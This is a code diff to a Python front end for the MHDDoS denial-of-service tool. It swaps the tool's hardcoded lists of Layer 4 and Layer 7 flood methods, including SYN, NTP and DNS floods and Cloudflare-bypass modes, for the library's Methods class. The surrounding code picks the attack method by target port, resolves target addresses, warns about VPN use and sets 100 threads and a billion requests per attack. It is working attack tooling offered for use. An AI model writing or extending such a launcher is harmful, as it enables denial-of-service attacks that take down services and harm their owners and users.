@@ -5,7 +5,7 @@ from sys import argv
 import colorama
 from humanfriendly.terminal import ansi_wrap
 
-from MHDDoS.start import start, ToolsConsole
+from MHDDoS.start import start, ToolsConsole, Methods
 from utils import print_vpn_warning, supports_complex_colors, is_valid_ipv4
 import validators
 
@@ -109,30 +109,24 @@ def receive_attack_method_from_input(default_method: str) -> str:
         method = default_method
     return method
 
-
-layer_4_attack_methods = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "MINECRAFT", "DNS", "CHAR", "ARD", "RDP"]
-layer_7_attack_methods = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM",
-                          "BYPASS", "BOMB"]
-
-
 def validate_attack_method(port: str, method: str, default_method: str) -> str:
     if method == default_method:
         return method
 
     port = int(port)
     is_layer_7_port = port == 80 or port == 443
-    if is_layer_7_port and (method in layer_7_attack_methods):
+    if is_layer_7_port and (method in Methods.LAYER7_METHODS):
         print_notice(f"Overriding attack method to '{method}' (Layer 7).")
-    elif method in layer_4_attack_methods:
+    elif method in Methods.LAYER4_METHODS:
         print_notice(f"Overriding attack method to '{method}' (Layer 4).")
-    elif method in layer_7_attack_methods:
+    elif method in Methods.LAYER7_METHODS:
         print_warning(f"Provided attack method ('{method}') if for Layer 7 attack, but the selected port ({port}) is from Layer 4. Layer 7 attack requires port 80 or 443.\n"
                       f"Will use the default Layer 4 method: '{default_method}'. If you want to execute Layer 7 attack, restart with port 80 or 443.\n")
     else:
         print_warning(f"Invalid attack method provided: '{method}'.\n"
                       f"Will use the default Layer 4 method: '{default_method}'. If you want to override it, restart with one of the valid options:\n"
-                      f"    For Layer 4: {', '.join(layer_4_attack_methods)}\n"
-                      f"    For Layer 7: {', '.join(layer_7_attack_methods)}\n")
+                      f"    For Layer 4: {', '.join(Methods.LAYER4_METHODS)}\n"
+                      f"    For Layer 7: {', '.join(Methods.LAYER7_METHODS)}\n")
         method = default_method
 
     return method
@@ -192,13 +186,13 @@ def kara():
         method = validate_attack_method(port, argv[3], default_method)
 
     # Use IP if attacking layer 4
-    if method in layer_4_attack_methods:
+    if method in Methods.LAYER4_METHODS:
         address = get_target_ip_address(address)
 
     hardcoded_n_threads = 100
     hardcoded_n_requests = 1000000000
 
-    if method in layer_7_attack_methods:
+    if method in Methods.LAYER7_METHODS:
         # Prepare URL attack arguments
         argv[1] = method
         argv.insert(2, address)
